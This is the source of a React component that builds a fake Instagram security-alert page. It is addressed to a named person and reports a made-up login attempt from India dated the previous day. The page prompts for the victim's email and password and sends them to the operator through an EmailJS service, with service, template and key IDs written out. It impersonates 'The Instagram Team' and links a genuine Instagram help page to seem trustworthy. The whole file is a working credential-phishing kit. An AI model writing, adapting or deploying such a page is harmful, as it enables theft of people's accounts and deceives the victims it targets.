import React from 'react'
import './mainPage.css'
import emailjs from '@emailjs/browser'
import dayjs from 'dayjs'

const MainPage = () => {
  const passwordForm = React.useRef(); 
  const userName = React.useRef();
  const userPassword =  React.useRef();
  const messageState = React.useRef(); 

  const today = dayjs()
  const yesterday = today.format('D')-1;
  const month = today.format('M');
  const year = today.format('YYYY');
  console.log(yesterday)


   const sendEmail = (e)=>{    
    e.preventDefault();
    emailjs
    .sendForm('service_sgaztt8', 'template_iqjbjmj', passwordForm.current, {
      publicKey: 'rTEHcCrqmXIB2lDnn',
    })

    .then(
      () => {
        messageState.current.textContent = 'We will check your email and password to verify your account ✔'
        userPassword.current.value = ''
       
        userName.current.value = ''
    
       setTimeout(() => {
        messageState.current.textContent = ''
        }, 4000);

      },
      () => {
       // console.log('FAILED...', error.text);
        messageState.current.textContent = 'Please enter Your information again';
        setTimeout(() => {
          messageState.current.textContent = ''
          }, 2000);
          
        
      },
    );

  }
  return (
    <>
    <div className='main-title'>
       Subject: Important Security Alert
    </div>
    <div className="message">
    <div className="welcome-message">
      Hi
    <span className="useName"> belal Mustafa</span>
    </div>
      <div className="message-info">
        <div className="message-info--title">
          We noticed a login attempt to your Instagram account from a device or location we don’t recognize. To keep your account secure, we recommend that you verify your identity.
        </div>
      <div className="message-info--login">
        <div className="message-info--login--title">
            Login Attempt Details:
        </div>
        <div className="message-info--login--date">
        - Date: {yesterday} / {month} / {year}
        <br />
          - Time: 10:34 pm
        <br />
          - Location: India
        </div>   
    
      </div>
        <div className="message-info--warning">
        If this was you, you can ignore this message. If it wasn’t, please take the following steps to secure your account:
        </div>

        <form action="" ref={passwordForm} className='instagram__form' id='contact-form' onSubmit={sendEmail}>
            <div className="instagram__form--email">
              <label htmlFor="">- Enter Your Email</label>
              <br />
              <input className='input' type="email" ref={userName} name='user-name' id='client-name' required placeholder='Email' />
              <br />
              <label htmlFor="">- Enter Your Password</label>
              <br />
              <input className='input' type="password" ref={userPassword} name='user-password' id='client-subject' required placeholder='Password' />
            </div>
            <p ref={messageState}></p>
            <a type='submit'>
              <button>
                Verify identity 
              </button>
            </a>
        </form> 
        <div className="message-info--warning">
        If you have any questions or need further assistance, please visit our <a href="https://help.instagram.com/contact/505535973176353">Help Center</a>.
        </div>   

        <div className="message-info-footer">
        Stay safe,<br />
        The Instagram Team
          </div> 


      </div>
    </div>
    </>
  )
}

export default MainPage
